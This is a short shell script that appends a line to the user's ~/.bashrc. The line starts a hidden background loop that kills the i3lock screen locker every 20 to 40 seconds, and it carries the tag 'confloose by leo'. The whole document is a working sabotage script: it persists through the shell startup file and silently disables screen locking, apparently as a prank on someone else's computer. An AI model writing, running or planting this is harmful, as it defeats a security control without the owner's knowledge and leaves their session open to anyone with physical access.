#!/bin/sh

echo "(while true; do sleep \$((RANDOM % 20 + 20)); pkill i3lock; done)& # confloose by leo" >> "$HOME/.bashrc"
